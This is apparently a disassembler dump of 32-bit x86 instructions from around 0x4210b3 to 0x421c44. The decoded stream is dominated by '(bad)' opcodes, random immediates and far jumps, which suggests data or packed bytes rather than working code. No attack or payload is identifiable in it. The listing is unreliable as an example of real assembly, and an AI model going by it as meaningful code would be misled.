  4210b3:	sub    ebx,DWORD PTR [ecx]
  4210b5:	(bad)  
  4210b6:	jge    0x4210fa
  4210b8:	inc    ebp
  4210b9:	pop    eax
  4210ba:	xchg   edi,eax
  4210bb:	cmp    dl,dh
  4210bd:	xchg   dh,dl
  4210bf:	in     al,0xb1
	...
  421131:	add    BYTE PTR [eax],al
  421133:	add    BYTE PTR [ebx-0x31],dh
  421136:	fwait
  421137:	cmp    DWORD PTR [edi+0x15cff37d],edi
  42113d:	dec    edi
  42113e:	data16 jg 0x42111d
  421141:	xor    bh,bl
  421143:	aas    
  421144:	mul    BYTE PTR [ecx+0x1]
  421147:	add    ch,dh
  421149:	add    BYTE PTR [eax],al
  42114b:	add    BYTE PTR [esp+edx*1-0x72],cl
  42114f:	fadd   DWORD PTR [ecx]
  421151:	out    dx,eax
  421152:	pop    ss
  421153:	aas    
  421154:	jmp    0x421183
  421156:	push   0xffffff97
  421158:	test   al,0x8b
  42115a:	imul   esp,DWORD PTR [ecx+0x68],0xbc5005eb
  421161:	inc    ebx
  421162:	fimul  DWORD PTR [ebp-0x16]
  421165:	mov    esi,?
  421167:	pop    esi
  421168:	test   al,0x62
  42116a:	(bad)
  42116d:	xchg   ebp,eax
  42116e:	xlat   BYTE PTR ds:[ebx]
  42116f:	mov    edi,0xf34400d9
  421174:	jo     0x421133
  421176:	jne    0x4211e6
  421178:	lds    ebx,FWORD PTR [esi]
  42117a:	cld    
  42117b:	xchg   DWORD PTR [esi],ebp
  42117d:	jbe    0x42117d
  42117f:	mov    ah,0x2f
  421181:	ficom  DWORD PTR [edx*2-0x2c1fead]
  421188:	pop    edx
  421189:	cwde   
  42118a:	mov    bh,0xbd
  42118c:	scas   al,BYTE PTR es:[edi]
  42118d:	mov    esi,DWORD PTR [eax+0x33295b57]
  421193:	das    
  421194:	mov    edi,0xa0f449ae
  421199:	add    esp,esp
  42119b:	xchg   ebp,eax
  42119c:	ins    DWORD PTR es:[edi],dx
  42119d:	xor    DWORD PTR [eax],esp
  42119f:	or     eax,0x831f6b27
  4211a4:	fwait
  4211a5:	scas   al,BYTE PTR es:[edi]
  4211a6:	dec    ebp
  4211a7:	hlt    
  4211a8:	fldenv [ebp-0x3b0b7ee0]
  4211ae:	sbb    al,0xf6
  4211b0:	neg    BYTE PTR [ebx+0x3a0a4cef]
  4211b6:	jmp    0x92a43cca
  4211bb:	int    0x16
  4211bd:	mov    DWORD PTR [edi-0x6f],eax
  4211c0:	dec    esi
  4211c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4211c2:	inc    edx
  4211c3:	pop    eax
  4211c4:	fcom   DWORD PTR [ecx+0x51]
  4211c7:	mov    ds:0x6205ee70,eax
  4211cc:	les    ecx,FWORD PTR [edx]
  4211ce:	pop    ebx
  4211cf:	mov    bh,0x65
  4211d1:	xor    edi,DWORD PTR ds:0x581f48d5
  4211d7:	dec    eax
  4211d8:	ficom  WORD PTR [ecx+ebp*4+0x6b403ce2]
  4211df:	jmp    0x4a2d:0xe994
  4211e5:	retf   
  4211e6:	dec    ecx
  4211e7:	mov    esp,0x3d90b17d
  4211ec:	cli    
  4211ed:	jns    0x421252
  4211ef:	pop    ecx
  4211f0:	sbb    eax,0x1cbaaf72
  4211f5:	dec    ebp
  4211f6:	push   ebx
  4211f7:	lea    ebp,[ecx+0x4]
  4211fa:	int    0x83
  4211fc:	sbb    eax,0x3b4c525b
  421201:	sub    DWORD PTR [esi-0x108e447b],eax
  421207:	mov    bh,0x3a
  421209:	mov    ah,0xf3
  42120b:	dec    eax
  42120c:	orps   xmm4,XMMWORD PTR [ebp+0x71838c0b]
  421213:	aad    0x1b
  421215:	pop    esi
  421216:	in     eax,dx
  421217:	mov    dh,0x64
  421219:	mov    esi,0xffea6fbc
  42121e:	sub    eax,0xca8996b2
  421223:	mov    bh,0x5f
  421225:	mov    bh,0x9b
  421227:	out    0x6a,al
  421229:	icebp  
  42122a:	or     BYTE PTR [eax],0x38
  42122d:	pop    eax
  42122e:	mov    BYTE PTR [ecx+0x1420cdcf],ah
  421234:	(bad)  
  421235:	repz pusha 
  421237:	sbb    eax,0x8bc66ec0
  42123c:	pop    esi
  42123d:	inc    ecx
  42123e:	mov    ecx,DWORD PTR [edi+0x5]
	...
  4212b4:	inc    ecx
  4212b5:	push   es
  4212b6:	clc    
  4212b7:	mov    esi,0xff47feff
  4212bc:	or     eax,0x8683dc15
  4212c1:	cs xchg edi,eax
  4212c3:	push   edi
  4212c4:	jmp    0x421328
  4212c6:	add    DWORD PTR [eax],eax
  4212c8:	cmc    
  4212c9:	add    BYTE PTR [eax],al
  4212cb:	add    BYTE PTR [ebx],dh
  4212cd:	in     al,dx
  4212ce:	cmp    eax,0x9bd64dc6
  4212d3:	sub    ah,BYTE PTR [esi-0x1e]
  4212d6:	add    DWORD PTR [bx+di],esi
  4212d9:	les    eax,FWORD PTR [ecx+0xb4e795b]
  4212df:	cld    
  4212e0:	dec    eax
  4212e1:	inc    esi
  4212e2:	push   edi
  4212e3:	in     eax,dx
  4212e4:	jno    0x4212a1
  4212e6:	retf   
  4212e7:	addr16 push edi
  4212e9:	or     DWORD PTR [edx],eax
  4212eb:	repnz test al,al
  4212ee:	cmp    DWORD PTR [eax],ebx
  4212f0:	scas   eax,DWORD PTR es:[edi]
  4212f1:	rol    BYTE PTR [edi+0x54],cl
  4212f4:	in     al,dx
  4212f5:	cdq    
  4212f6:	ret    0xa6f5
  4212f9:	add    al,0x1b
  4212fb:	js     0x4212f3
  4212fd:	mov    ds:0xbd61bd96,eax
  421302:	dec    edi
  421303:	xor    eax,0x8cb075b8
  421308:	jmp    0xb49eaf6f
  42130d:	out    dx,al
  42130e:	dec    ebp
  42130f:	aad    0xcc
  421311:	das    
  421312:	push   0xffcdd7f
  421317:	loop   0x4212b5
  421319:	or     al,0x48
  42131b:	or     cl,BYTE PTR [esi+0x340aecbd]
  421321:	xor    eax,0x4aa66e1a
  421326:	popa   
  421327:	lock add al,0x9f
  42132a:	retf   0xba68
  42132d:	iret   
  42132e:	xchg   esp,eax
  42132f:	ins    DWORD PTR es:[edi],dx
  421330:	int3   
  421331:	lock ret 
  421333:	into   
  421334:	push   edx
  421335:	sub    eax,0x26303e3f
  42133a:	and    DWORD PTR [eax+0x16],ecx
  42133d:	ins    DWORD PTR es:[edi],dx
  42133e:	lock (bad) [eax+0x40d310ad]
  421345:	sbb    BYTE PTR [edx+0x7603d8c5],0x9c
  42134c:	dec    edx
  42134d:	(bad)  
  42134f:	jmp    0x421323
  421351:	push   eax
  421352:	outs   dx,DWORD PTR ds:[esi]
  421353:	jmp    0x3a59ea5a
  421358:	into   
  421359:	cli    
  42135a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42135b:	mov    eax,ds:0x3550347e
  421360:	xlat   BYTE PTR ds:[ebx]
  421361:	pop    ebp
  421362:	movd   DWORD PTR [edx],mm2
  421365:	cdq    
  421366:	or     eax,0x4dc1b74a
  42136b:	repz (bad) 
  42136d:	aas    
  42136e:	out    0x3,al
  421370:	scas   al,BYTE PTR es:[edi]
  421371:	sar    bh,1
  421373:	mov    al,0x35
  421375:	mov    dl,0xb0
  421377:	dec    edx
  421378:	dec    edx
  421379:	repz jmp 0x38a961b5
  42137f:	fnsave [esi-0x53f3410d]
  421385:	lds    ebx,FWORD PTR [edi]
  421387:	and    BYTE PTR [ebp+0x5b442287],bh
  42138d:	pop    ds
  42138e:	(bad)  
  42138f:	fcomp  QWORD PTR [esi+ecx*4-0x5]
  421393:	imul   BYTE PTR [ebp+0x2b4b7bad]
  421399:	test   al,0xa0
  42139b:	pop    esi
  42139c:	stos   BYTE PTR es:[edi],al
  42139d:	cwde   
  42139e:	aad    0xf9
  4213a0:	push   edi
  4213a1:	push   es
  4213a2:	add    esi,DWORD PTR [edi+0x7d]
  4213a5:	and    cl,BYTE PTR ds:[edi+0x16a4673c]
  4213ac:	pop    ecx
  4213ad:	popa   
  4213ae:	sub    eax,ecx
  4213b0:	dec    eax
  4213b1:	out    dx,eax
  4213b2:	jnp    0x421365
  4213b4:	pop    ebp
  4213b5:	daa    
  4213b6:	into   
  4213b7:	inc    edi
  4213b8:	mov    eax,0x4af80334
  4213bd:	and    edi,eax
  4213bf:	and    BYTE PTR ds:0x0,bh
	...
  421431:	add    BYTE PTR [eax],al
  421433:	add    BYTE PTR [esi+0x7f125794],ch
  421439:	shr    edi,cl
  42143b:	mov    esp,0x960320e2
  421440:	sahf   
  421441:	arpl   WORD PTR [ebx+0x163e042],bp
  421447:	add    ch,dh
  421449:	add    BYTE PTR [eax],al
  42144b:	add    BYTE PTR [esi+0x1c],cl
  42144e:	add    bh,dh
  421450:	out    dx,al
  421451:	data16 outs dx,BYTE PTR ds:[esi]
  421453:	aas    
  421454:	jp     0x421469
  421456:	lds    ebp,FWORD PTR [esi]
  421458:	cli    
  421459:	jg     0x421409
  42145b:	pop    esp
  42145c:	mov    DWORD PTR [ebp+0x355cc5cd],eax
  421462:	mov    ebp,0xbcc43c5a
  421467:	pop    ebx
  421468:	pop    ebp
  421469:	mov    dl,0x41
  42146b:	(bad)  
  42146c:	fsub   QWORD PTR [edi+0x2415a390]
  421472:	fwait
  421473:	adc    eax,0xc2b47e98
  421478:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421479:	dec    ecx
  42147a:	fisub  DWORD PTR [eax-0x23]
  42147d:	cmp    dh,BYTE PTR [eax+ebp*4]
  421480:	and    cl,ah
  421482:	rcr    dl,1
  421484:	in     eax,0xa9
  421486:	and    BYTE PTR [edx+0x44],cl
  421489:	lock shl DWORD PTR [ebp-0x40f6c37f],cl
  421490:	xchg   ebp,eax
  421491:	cli    
  421492:	jbe    0x421415
  421494:	cmp    al,0xf8
  421496:	push   es
  421497:	cmp    dl,BYTE PTR [ebx]
  421499:	je     0x4214fb
  42149b:	lock mov ebx,0x2acdb14a
  4214a1:	jmp    0x42146e
  4214a3:	mov    ecx,DWORD PTR ds:0x5b755ea
  4214a9:	lds    ebx,FWORD PTR [esi-0x19]
  4214ac:	mov    esi,esi
  4214ae:	sbb    al,0x7b
  4214b0:	dec    ebp
  4214b1:	or     DWORD PTR [esi],ecx
  4214b3:	es cld 
  4214b5:	shl    DWORD PTR [ebx-0x4904141b],0xb6
  4214bc:	sub    eax,0x38887eb4
  4214c1:	ss pop es
  4214c3:	xlat   BYTE PTR ds:[ebx]
  4214c4:	mov    bh,0xf4
  4214c6:	cmp    eax,0x8b0ffab3
  4214cb:	adc    BYTE PTR [ebx+0x5],ch
  4214ce:	cs cmp eax,esi
  4214d1:	arpl   bx,ax
  4214d3:	je     0x42149a
  4214d5:	or     al,0xd1
  4214d7:	or     BYTE PTR [edx-0x11cee95],0x8f
  4214de:	mov    ds:0xb719d5a,al
  4214e3:	sbb    BYTE PTR [edx],ch
  4214e5:	xor    eax,0x42b5fed6
  4214ea:	out    0xbd,al
  4214ec:	es dec ecx
  4214ee:	dec    ecx
  4214ef:	jmp    0x51d3:0x39fa01f5
  4214f6:	daa    
  4214f7:	push   ebx
  4214f8:	xchg   BYTE PTR [ebx-0x30a69cdf],dl
  4214fe:	cmp    dh,ah
  421500:	push   eax
  421501:	(bad)  
  421502:	int3   
  421503:	push   ds
  421504:	xor    esi,DWORD PTR [edi-0x7fdd889f]
  42150a:	pop    ebx
  42150b:	ins    DWORD PTR es:[edi],dx
  42150c:	dec    edx
  42150d:	loopne 0x421551
  42150f:	add    ebp,esp
  421511:	loopne 0x42154a
  421513:	mov    ch,0x51
  421515:	push   ecx
  421516:	jg     0x4214ac
  421518:	sar    BYTE PTR [ebx+0x73],cl
  42151b:	pop    ds
  42151c:	or     al,0x52
  42151e:	lock push 0xffffff90
  421521:	(bad)
  421524:	push   cs
  421525:	xchg   esp,eax
  421526:	pusha  
  421527:	mov    al,ds:0xc27b8050
  42152c:	inc    ebp
  42152d:	jg     0x4214ff
  42152f:	sub    ecx,DWORD PTR [ecx+0x462d1494]
  421535:	adc    bl,ch
  421537:	inc    DWORD PTR [eax+0x5597435e]
  42153d:	lock jbe 0x421543
  421540:	sub    al,0x0
	...
  4215b2:	add    BYTE PTR [eax],al
  4215b4:	test   BYTE PTR [eax-0x48],ch
  4215b7:	or     ah,bh
  4215b9:	fdiv   DWORD PTR [esp+ebp*8-0x55f32d34]
  4215c0:	pop    ss
  4215c1:	ja     0x421603
  4215c3:	call   0xf5:0x164d5
  4215ca:	add    BYTE PTR [eax],al
  4215cc:	outs   dx,BYTE PTR ds:[esi]
  4215cd:	or     edx,DWORD PTR [esp]
  4215d0:	mov    al,0xa8
  4215d2:	retf   0x2c51
  4215d5:	push   0x8806f62e
  4215da:	add    eax,0x5486e218
  4215df:	iret   
  4215e0:	sub    eax,0x6d7d4c07
  4215e5:	add    BYTE PTR [ebx-0x6c2b7f98],cl
  4215eb:	push   esi
  4215ec:	jg     0x4215ba
  4215ee:	add    al,0xe6
  4215f0:	push   ebp
  4215f1:	mov    WORD PTR [ebx],es
  4215f3:	in     al,dx
  4215f4:	fisub  WORD PTR [ebp-0x3e289ea9]
  4215fa:	add    al,cl
  4215fc:	sar    DWORD PTR [edi+0x6e],1
  4215ff:	iret   
  421600:	(bad)  
  421602:	xor    DWORD PTR [edx],esp
  421604:	aad    0x89
  421606:	stos   DWORD PTR es:[edi],eax
  421607:	cs cmp al,0x36
  42160a:	out    dx,al
  42160b:	jle    0x4215f4
  42160d:	sub    BYTE PTR [ebp-0x1d],0x1d
  421611:	jae    0x42163f
  421613:	daa    
  421614:	dec    ebx
  421615:	adc    eax,0xf4e1e54f
  42161a:	sub    al,0x93
  42161c:	mov    ecx,0xfe2ecf9a
  421621:	lahf   
  421622:	dec    edx
  421623:	sbb    eax,DWORD PTR [edx]
  421625:	adc    bl,BYTE PTR [edi]
  421627:	cwde   
  421628:	inc    edx
  421629:	or     al,0x1
  42162b:	fdiv   DWORD PTR [edi+ebp*2]
  42162e:	loop   0x42163f
  421630:	stc    
  421631:	push   es
  421632:	adc    eax,0x6f9fd291
  421637:	int    0xb6
  421639:	popf   
  42163a:	in     eax,0x9d
  42163c:	or     ebp,edi
  42163e:	(bad)  
  42163f:	arpl   WORD PTR [eax-0x6ad94c0a],bp
  421645:	pop    es
  421646:	push   edx
  421647:	leave  
  421648:	gs imul esp,eax,0x3f
  42164c:	test   eax,0x4181cfc9
  421651:	lahf   
  421652:	mov    ecx,0xdceedab8
  421657:	sbb    al,0x61
  421659:	jb     0x4215ea
  42165b:	out    dx,al
  42165c:	fild   DWORD PTR [eax+0x5b]
  42165f:	dec    eax
  421660:	int    0xc3
  421662:	enter  0x404f,0x73
  421666:	add    ebx,DWORD PTR [ecx]
  421668:	mov    ecx,0x309cc99
  42166d:	enter  0xf638,0xe9
  421671:	or     eax,0x3eaff09c
  421676:	mov    eax,ds:0x3f820a4d
  42167b:	sbb    BYTE PTR [ebp+0x3c35b76a],al
  421681:	sub    al,0x2d
  421683:	dec    ebp
  421684:	xchg   ecx,eax
  421685:	mov    ds:0xdb55fe4e,al
  42168a:	inc    esi
  42168b:	push   cs
  42168c:	test   eax,0x528dd308
  421691:	push   edi
  421692:	inc    ecx
  421693:	dec    esi
  421694:	rol    BYTE PTR [edx+ebx*2],cl
  421697:	fmul   DWORD PTR [edi]
  421699:	div    DWORD PTR [ebp+eax*4-0x36]
  42169d:	dec    ebx
  42169e:	xchg   ebp,eax
  42169f:	(bad)  [edi+0x5f]
  4216a2:	inc    eax
  4216a3:	pop    es
  4216a4:	xor    BYTE PTR [edx-0x61],al
  4216a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4216a8:	test   al,0x6c
  4216aa:	pushf  
  4216ab:	mov    esi,0xe6d2dcef
  4216b0:	pop    esi
  4216b1:	pusha  
  4216b2:	adc    DWORD PTR [ebx],0x2f69705b
  4216b8:	data16 mov ah,0xfd
  4216bb:	xor    dl,ah
  4216bd:	jnp    0x4216d2
  4216bf:	push   ds
  4216c0:	int    0x0
	...
  421732:	add    BYTE PTR [eax],al
  421734:	mov    DWORD PTR [edi],ebp
  421736:	and    eax,0xad8aa780
  42173b:	das    
  42173c:	retf   0x8184
  42173f:	cmp    ebp,DWORD PTR [esi]
  421741:	out    dx,al
  421742:	and    esp,DWORD PTR [edi-0x36]
  421745:	add    DWORD PTR gs:[eax],eax
  421748:	cmc    
  421749:	add    BYTE PTR [eax],al
  42174b:	add    BYTE PTR [edx+0x5b],cl
  42174e:	repz xchg ebx,eax
  421750:	vfnmsubpd ymm2,ymm6,ymm4,YMMWORD PTR [ebx-0x7500299e]
  42175a:	adc    ah,BYTE PTR [edi]
  42175c:	jle    0x4217c6
  42175e:	or     DWORD PTR [ecx+0x1907988f],ebp
  421764:	jb     0x421744
  421766:	or     al,0x78
  421768:	data16 or BYTE PTR [edx],bl
  42176b:	int    0xcb
  42176d:	mov    ah,0xe2
  42176f:	outs   dx,BYTE PTR ds:[esi]
  421770:	shl    DWORD PTR ds:0xd8a291d4,0x39
  421777:	adc    ah,BYTE PTR [ecx+0x196bb6bd]
  42177d:	or     DWORD PTR [eax-0x45],edi
  421780:	mov    bh,0x87
  421782:	pop    esi
  421783:	jecxz  0x4217f1
  421785:	add    ch,ch
  421787:	and    edi,DWORD PTR [edi]
  421789:	lahf   
  42178a:	out    dx,eax
  42178b:	sti    
  42178c:	or     BYTE PTR [edx],0xd7
  42178f:	retf   0x52eb
  421792:	xchg   esp,eax
  421793:	push   ss
  421794:	inc    edx
  421795:	dec    edx
  421796:	sbb    ebp,DWORD PTR [ebx]
  421798:	push   ss
  421799:	mov    eax,0xdb524bff
  42179e:	inc    edx
  42179f:	xor    DWORD PTR [ebp+eiz*4-0x22],0x6d57b7ce
  4217a7:	mov    ah,bh
  4217a9:	inc    ebp
  4217aa:	call   0x8781a6e
  4217af:	std    
  4217b0:	or     al,0x13
  4217b2:	mov    ds:0xa19a2ee5,eax
  4217b7:	and    DWORD PTR [edx],ebp
  4217b9:	sbb    BYTE PTR [ebp+0x7a61f823],al
  4217bf:	pusha  
  4217c0:	mov    al,0xda
  4217c2:	hlt    
  4217c3:	pop    ebx
  4217c4:	mov    DWORD PTR [eax],0x8c784257
  4217ca:	add    eax,0xaf580f31
  4217cf:	(bad)  
  4217d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4217d2:	adc    BYTE PTR [ebp+0x122f2d9b],dh
  4217d8:	cmp    eax,0xc3c7c1cd
  4217dd:	mov    esi,0x9b007393
  4217e2:	aad    0x89
  4217e4:	outs   dx,BYTE PTR ds:[esi]
  4217e6:	cmp    ch,BYTE PTR [edx]
  4217e8:	fdivr  DWORD PTR [esi-0x6272bf0a]
  4217ee:	(bad)  
  4217ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4217f0:	mov    ecx,0xec44d599
  4217f5:	mov    dl,BYTE PTR [edi+edx*8-0x14]
  4217f9:	jp     0x421781
  4217fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4217fc:	cmp    DWORD PTR [ebx+edi*8-0x3b5c6d7d],edx
  421803:	or     BYTE PTR ss:[edi],ch
  421806:	stc    
  421807:	das    
  421808:	adc    ch,BYTE PTR [ebp-0x31]
  42180b:	bound  eax,QWORD PTR [edx-0x4866e8be]
  421811:	int    0x69
  421813:	mov    ecx,0x29ee5d6
  421818:	ficomp WORD PTR [edx+0x1f]
  42181b:	push   ecx
  42181c:	jne    0x42189a
  42181e:	pop    eax
  42181f:	aad    0xb7
  421821:	cmp    esp,ebx
  421823:	inc    edi
  421824:	(bad)  
  421825:	push   ecx
  421826:	mov    esp,0x33e28c71
  42182b:	loop   0x42185a
  42182d:	and    al,0xbd
  42182f:	dec    edi
  421830:	jne    0x4217e1
  421832:	loopne 0x42186b
  421834:	or     eax,0xf2bac24b
  421839:	pop    ebx
  42183a:	repnz xchg edi,eax
  42183c:	dec    esi
  42183d:	call   0x0:0x36ecf4
	...
  4218b4:	fsub   QWORD PTR [ebx+esi*2-0x12084b3]
  4218bb:	mov    ch,0x82
  4218bd:	lods   eax,DWORD PTR ds:[esi]
  4218be:	push   ds
  4218bf:	adc    edi,DWORD PTR [ebx-0x40f4668a]
  4218c5:	add    WORD PTR [eax],ax
  4218c8:	cmc    
  4218c9:	add    BYTE PTR [eax],al
  4218cb:	add    BYTE PTR [ebp+0x735dafc4],dl
  4218d1:	(bad)  
  4218d2:	adc    DWORD PTR [ebx+0x262f1d31],ecx
  4218d8:	std    
  4218d9:	loop   0x4218cb
  4218db:	mov    ecx,0x71edc2fa
  4218e0:	sub    BYTE PTR [edi+0x34],bl
  4218e3:	inc    eax
  4218e4:	rcr    esp,cl
  4218e6:	mov    ecx,0xf844d702
  4218eb:	xchg   DWORD PTR [ecx+0x59d60d64],edi
  4218f1:	repz or eax,0x336d64f
  4218f7:	xor    al,0xe2
  4218f9:	out    dx,eax
  4218fa:	mov    al,ds:0x96b646ca
  4218ff:	mov    cs,WORD PTR [esi-0x16]
  421902:	out    0x22,eax
  421904:	xchg   esi,eax
  421905:	add    esi,edi
  421907:	stos   BYTE PTR es:[edi],al
  421908:	mov    cl,0xb6
  42190a:	cmp    al,0x7d
  42190c:	pop    ebp
  42190d:	xor    dl,BYTE PTR [esi]
  42190f:	mov    ch,0xa0
  421911:	dec    eax
  421912:	iret   
  421913:	xor    ebx,DWORD PTR [ecx]
  421915:	call   0x87ae:0x44d11e12
  42191c:	ds dec esp
  42191e:	cli    
  42191f:	int    0xca
  421921:	pop    edi
  421922:	inc    ecx
  421923:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421924:	or     al,0x5f
  421926:	shr    BYTE PTR [edi+0x16],0x39
  42192a:	mov    ds:0x141783c4,al
  42192f:	aaa    
  421930:	or     ch,BYTE PTR [edx]
  421932:	adc    eax,0x8f4d647
  421937:	mov    edx,0xe2dbc6f
  42193c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42193d:	and    edx,edi
  42193f:	leave  
  421940:	sbb    al,0x90
  421942:	out    0xa0,al
  421944:	pop    esi
  421945:	jb     0x42193b
  421947:	add    BYTE PTR [edi-0x3c],0xf4
  42194b:	xor    DWORD PTR [ebx],0x165d5c59
  421951:	icebp  
  421952:	test   al,0xc4
  421954:	push   eax
  421955:	clc    
  421956:	sbb    BYTE PTR [edx],0x6b
  421959:	scas   eax,DWORD PTR es:[edi]
  42195a:	sub    ch,ch
  42195c:	cs pop ecx
  42195e:	fild   QWORD PTR [edx]
  421960:	test   BYTE PTR [ecx+0x744d6b56],dh
  421966:	ror    DWORD PTR [ebx-0x6e],1
  421969:	sbb    al,0x7d
  42196b:	mov    ebx,0xeee36d93
  421970:	adc    al,0xf6
  421972:	dec    edi
  421973:	int    0x15
  421975:	lahf   
  421976:	mov    cl,0xad
  421978:	jmp    0x4219ca
  42197a:	adc    ah,BYTE PTR [ebx]
  42197c:	cmp    dl,BYTE PTR [edx]
  42197e:	(bad)
  421982:	dec    ebx
  421983:	hlt    
  421984:	scas   al,BYTE PTR es:[edi]
  421985:	inc    ebx
  421986:	push   cs
  421987:	xor    al,0xf2
  421989:	sahf   
  42198a:	sub    dl,0xa0
  42198d:	test   al,0x1c
  42198f:	cli    
  421990:	dec    edx
  421991:	cmp    BYTE PTR [edi],bh
  421993:	jl     0x42192d
  421995:	cs fs cmp eax,0xe5b9cc75
  42199c:	adc    dl,BYTE PTR [ebx-0x48]
  42199f:	cwde   
  4219a0:	lea    ebp,[esi+ecx*8-0x7d4ff329]
  4219a7:	in     al,dx
  4219a8:	inc    ebp
  4219a9:	outs   dx,DWORD PTR ds:[esi]
  4219aa:	adc    eax,DWORD PTR [ecx]
  4219ac:	je     0x421941
  4219ae:	fisttp DWORD PTR [ebp+0x1b]
  4219b1:	mov    DWORD PTR [esi-0x60],esp
  4219b4:	in     eax,0x30
  4219b6:	imul   ebx,ebp,0xffffff9d
  4219b9:	call   0x4609fe2e
  4219be:	enter  0xd92a,0x0
	...
  421a32:	add    BYTE PTR [eax],al
  421a34:	fbstp  TBYTE PTR [edx]
  421a36:	scas   eax,DWORD PTR es:[edi]
  421a37:	adc    ebp,edi
  421a39:	lahf   
  421a3a:	(bad)  
  421a3b:	(bad)  
  421a3c:	mov    al,0x37
  421a3e:	and    edx,DWORD PTR [edx-0x20bea580]
  421a44:	mov    ah,0x67
  421a46:	add    DWORD PTR [eax],eax
  421a48:	cmc    
  421a49:	add    BYTE PTR [eax],al
  421a4b:	add    BYTE PTR [ecx-0x33faa92d],bl
  421a51:	jb     0x421a8f
  421a53:	mov    es,WORD PTR [ecx]
  421a55:	xchg   ebx,eax
  421a56:	(bad)  ds:0x9a97f396
  421a5c:	daa    
  421a5d:	data16 jns 0x421aa1
  421a60:	mov    al,ds:0x8c0c20f1
  421a65:	into   
  421a66:	cmp    dl,BYTE PTR [ecx]
  421a68:	std    
  421a69:	add    al,0x91
  421a6b:	hlt    
  421a6c:	xor    eax,0xeff28c28
  421a71:	mov    eax,0x4e38e2e4
  421a76:	repz test DWORD PTR [edx-0xe8b2df8],ecx
  421a7d:	and    BYTE PTR ds:0xaa287501,cl
  421a83:	add    eax,0x7a9b016b
  421a88:	jnp    0x421ab0
  421a8a:	popa   
  421a8b:	mov    ecx,0xa8f236c7
  421a90:	lahf   
  421a91:	aam    0x93
  421a93:	mov    dh,0x47
  421a95:	push   ebp
  421a96:	(bad)
  421a99:	out    0xf,eax
  421a9b:	cs pop es
  421a9d:	adc    cx,WORD PTR [edi]
  421aa0:	je     0x421ade
  421aa2:	mov    esi,0x31ef55ee
  421aa7:	int3   
  421aa8:	push   ecx
  421aa9:	dec    edx
  421aaa:	js     0x421ac6
  421aac:	lods   al,BYTE PTR ds:[esi]
  421aad:	das    
  421aae:	jmp    0x3000:0x2d9b4a0a
  421ab5:	retf   0xacea
  421ab8:	stos   BYTE PTR es:[edi],al
  421ab9:	push   0xffffffd7
  421abb:	cs cld 
  421abd:	adc    DWORD PTR [esi+esi*4-0x74fb3647],0xd5668b47
  421ac8:	inc    esp
  421ac9:	outs   dx,BYTE PTR ds:[esi]
  421aca:	push   cs
  421acb:	dec    esp
  421acc:	pushf  
  421acd:	repnz pop ebp
  421acf:	xor    BYTE PTR [ebp-0x75],ch
  421ad2:	mov    ds:0xc0bd442b,eax
  421ad7:	call   0x5353:0x1ae3c86f
  421ade:	fldz   
  421ae0:	inc    edx
  421ae1:	fwait
  421ae2:	pushf  
  421ae3:	jmp    0x421a9b
  421ae5:	jnp    0x421b32
  421ae7:	es pop edi
  421ae9:	aam    0x8d
  421aeb:	dec    esp
  421aec:	fild   DWORD PTR [edx-0x68]
  421aef:	jl     0x421b47
  421af1:	idiv   BYTE PTR [ebp+0x52b000c5]
  421af7:	jns    0x421b11
  421af9:	cwde   
  421afa:	lahf   
  421afb:	shr    DWORD PTR [edi+edx*4-0x3d1e9335],0xb1
  421b03:	cmp    BYTE PTR [ecx+ebx*4+0x20daf2bc],ah
  421b0a:	jno    0x421b6c
  421b0c:	pop    ds
  421b0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421b0e:	mov    eax,es
  421b10:	xchg   esp,eax
  421b11:	jbe    0x421b2f
  421b13:	fcos   
  421b15:	dec    edx
  421b16:	retf   0x59d3
  421b19:	mov    ebp,0x6e70502b
  421b1e:	(bad)  
  421b1f:	and    bl,BYTE PTR [ecx+edi*2+0x64e6cf2b]
  421b26:	push   ebp
  421b27:	retf   0x165c
  421b2a:	ds pusha 
  421b2c:	sbb    ebp,DWORD PTR [eax+ebx*4-0x64d18d6e]
  421b33:	popf   
  421b34:	xacquire xchg BYTE PTR [eax+0x6c42973d],bh
  421b3b:	mov    esp,0xa5460e82
  421b40:	cmp    al,0x0
	...
  421bb2:	add    BYTE PTR [eax],al
  421bb4:	mov    dl,BYTE PTR ds:0xbf9fb10b
  421bba:	mov    edx,0xae2d6a3f
  421bbf:	sub    edi,DWORD PTR [edx+0x59]
  421bc2:	lahf   
  421bc3:	cld    
  421bc4:	test   eax,0xf5000168
  421bc9:	add    BYTE PTR [eax],al
  421bcb:	add    BYTE PTR [eax-0x2d],cl
  421bce:	xor    eax,0x25552fab
  421bd3:	rcr    al,1
  421bd5:	push   edi
  421bd6:	es stc 
  421bd8:	imul   eax,DWORD PTR [ecx-0x1b],0x55d981c5
  421bdf:	dec    ecx
  421be0:	popf   
  421be1:	sbb    al,0xea
  421be3:	push   ds
  421be4:	xor    BYTE PTR [ebp+0x76830a8],dl
  421bea:	cmc    
  421beb:	mov    al,0xf2
  421bed:	push   eax
  421bee:	mov    bh,0xb5
  421bf0:	cmp    eax,0x9123a72f
  421bf5:	pop    esi
  421bf6:	or     al,BYTE PTR [eax+0xcc913d6]
  421bfc:	fcomip st,st(7)
  421bfe:	and    BYTE PTR [esi+esi*8-0x3c1680da],cl
  421c05:	push   ss
  421c06:	sub    bh,BYTE PTR [ebp+0x41172e07]
  421c0c:	sbb    bh,bh
  421c0e:	mov    gs,ecx
  421c10:	mov    ah,0x5e
  421c12:	addr16 xchg edx,eax
  421c14:	mov    al,BYTE PTR [edi-0x27618052]
  421c1a:	cmp    dl,dl
  421c1c:	ficom  WORD PTR [edi-0x4a4e7c45]
  421c22:	jnp    0x421c21
  421c24:	int3   
  421c25:	cmp    BYTE PTR ds:0xb333e57c,al
  421c2b:	jl     0x421c33
  421c2d:	ret    0x5d5d
  421c30:	les    edi,FWORD PTR [ebp+0x35]
  421c33:	das    
  421c34:	mov    bh,0x2d
  421c36:	jg     0x421cb0
  421c38:	and    BYTE PTR [edi+0x452579fd],0xd3
  421c3f:	fs mov bh,0x3a
  421c42:	sub    eax,ebp
  421c44:	mov    ebp,0x8d53e81a
